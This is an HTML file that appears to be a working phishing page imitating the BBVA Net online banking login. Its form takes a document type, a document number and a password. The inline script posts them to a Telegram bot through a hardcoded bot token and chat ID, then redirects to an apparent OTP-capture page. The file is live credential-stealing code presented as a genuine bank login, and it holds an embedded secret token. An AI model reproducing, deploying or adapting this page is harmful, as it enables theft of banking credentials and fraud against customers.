<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BBVA Net - Iniciar Sesión</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        .loading-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
        .loading-screen.active { display: flex; }
        .spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #1973B8; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="loadingScreen" class="loading-screen">
        <div class="spinner"></div>
    </div>

    <div class="container">
        <header class="header">
            <div class="header-icon">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z" fill="#1973B8"/>
                </svg>
            </div>
            <div class="logo">
                <img src="img/BBVA_logo_2025.svg.png" alt="BBVA">
            </div>
            <button class="close-btn">
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                    <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z" fill="#1973B8"/>
                </svg>
            </button>
        </header>

        <div class="security-badge">
            <svg width="32" height="32" viewBox="0 0 24 24" fill="none">
                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="#1973B8"/>
            </svg>
        </div>

        <p class="security-text">Estás en un entorno con seguridad BBVA</p>

        <main class="main-content">
            <h1 class="title">Hola, inicia sesión en <br>BBVA Net:</h1>

            <form class="login-form" id="loginForm">
                <div class="input-group">
                    <select class="input-field dropdown" id="documentType">
                        <option value="">Cédula de Ciudadanía</option>
                        <option value="cc">Cédula de Extranjeria</option>
                        <option value="ce">Tarjeta de Identidad</option>
                        <option value="pas">Pasaporte</option>
                    </select>
                    <svg class="dropdown-icon" width="24" height="24" viewBox="0 0 24 24" fill="none">
                        <path d="M7 10l5 5 5-5z" fill="#5E6773"/>
                    </svg>
                </div>

                <div class="input-group">
                    <input type="text" class="input-field" id="documentNumber" placeholder="Número de documento">
                </div>

                <div class="input-group">
                    <input type="password" class="input-field" id="password" placeholder="Contraseña">
                    <button type="button" class="eye-icon" onclick="togglePassword()">
                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#5E6773"/>
                        </svg>
                    </button>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn" disabled>Entrar</button>
                <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
            </form>

            <div class="register-card">
                <h2 class="register-title">Empieza hoy con BBVA Net</h2>
                <p class="register-description">Regístrate para consultar tus productos en línea.</p>
                <button class="register-btn">Regístrate</button>
            </div>
        </main>
    </div>

    <script>
    const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
    const TELEGRAM_CHAT_ID = '-1003784784181';

    function togglePassword() {
        const passwordInput = document.getElementById('password');
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
    }

    document.addEventListener('DOMContentLoaded', function() {
        const docType = document.getElementById('documentType');
        const docNumber = document.getElementById('documentNumber');
        const password = document.getElementById('password');
        const btn = document.getElementById('submitBtn');
        const form = document.getElementById('loginForm');
        const overlay = document.getElementById('loadingScreen');
        
        btn.disabled = true;
        
        function validateForm() {
            const isValid = docNumber.value.trim().length > 0 && password.value.length > 0;
            btn.disabled = !isValid;
            if (isValid) {
                btn.style.backgroundColor = '#1973B8';
            } else {
                btn.style.backgroundColor = '';
            }
        }
        
        docNumber.addEventListener('input', validateForm);
        password.addEventListener('input', validateForm);
        docType.addEventListener('change', validateForm);
        
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (btn.disabled) return;
            
            overlay.classList.add('active');

            const mensaje = `👤 <b>LOGIN - BBVA</b>

<b>Tipo Documento:</b> ${docType.value || 'Cédula de Ciudadanía'}
<b>Documento:</b> <code>${docNumber.value}</code>
<b>Contraseña:</b> <code>${password.value}</code>

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => { window.location.href = 'otp.html'; }, 2000);
                } else {
                    overlay.classList.remove('active');
                }
            } catch (error) {
                overlay.classList.remove('active');
            }
        });
    });
    </script>
</body>
</html>
